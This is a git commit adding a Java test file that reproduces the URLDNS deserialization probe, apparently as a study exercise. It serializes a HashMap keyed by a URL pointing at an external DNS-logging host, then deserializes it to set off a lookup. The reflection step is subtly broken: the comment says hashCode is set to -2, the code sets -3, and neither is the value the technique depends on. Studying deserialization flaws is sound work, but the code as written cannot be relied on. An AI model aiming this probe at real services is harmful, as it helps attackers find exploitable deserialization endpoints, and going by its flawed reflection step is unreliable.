071e8ffe912c2e9666f50b473256ec94c5875d06
pwjwc <you@example.com>
2024-05-30 11:12:29 +0800

    update

---
+++ Deserialize/src/main/java/com/pwjcw/Test/DnsTest.java
@@ -0,0 +1,67 @@
+package com.pwjcw.Test;
+
+import org.junit.Test;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.net.MalformedURLException;
+import java.net.URL;
+import java.util.HashMap;
+import java.util.Map;
+
+public class DnsTest {
+
+    /**
+     * 测试map的key为url时，是否会进行dns查询
+     * @throws MalformedURLException
+     * @throws ClassNotFoundException
+     * @throws NoSuchFieldException
+     * @throws IllegalAccessException
+     */
+    @Test
+    public void testDns() throws MalformedURLException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
+        Map<URL,String> map=new HashMap<>();
+        URL url = new URL("http://dragiuvioo.dgrh3.cn");
+        map.put(url,"dnslog");
+    }
+
+    /**
+     * 将一个封装了url对象的map集合进行序列化
+     * @throws IOException
+     * @throws ClassNotFoundException
+     * @throws NoSuchFieldException
+     * @throws IllegalAccessException
+     */
+    @Test
+    public void testUrlDnsSer() throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
+        //创建一个map对象
+        Map<URL,String> map=new HashMap<>();
+        URL url = new URL("http://dragiuvioo.dgrh3.cn");
+        map.put(url,"dnslog");
+
+        //通过反射将url对象的hashcode值设置为-2
+        Class<?> aClass = Class.forName("java.net.URL");
+        Field hashCode = aClass.getDeclaredField("hashCode");
+        hashCode.setAccessible(true);
+        hashCode.set(url,-3);
+
+        //进行序列化map对象
+        FileOutputStream fileOutputStream = new FileOutputStream("Dnslog.ser");
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
+        objectOutputStream.writeObject(map);
+
+    }
+
+    /**
+     * 反序列化一个封装了url的map集合，查看在反序列化的时候，是否会进行dns解析，解析的根本原因是因为map集合自定义的readObject方法调用了putVal(hash(key)
+     * @throws IOException
+     * @throws ClassNotFoundException
+     */
+    @Test
+    public void testUrlDnsUnSer() throws IOException, ClassNotFoundException {
+        FileInputStream fileInputStream = new FileInputStream("Dnslog.ser");
+        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
+        Object o = objectInputStream.readObject();
+
+    }
+}
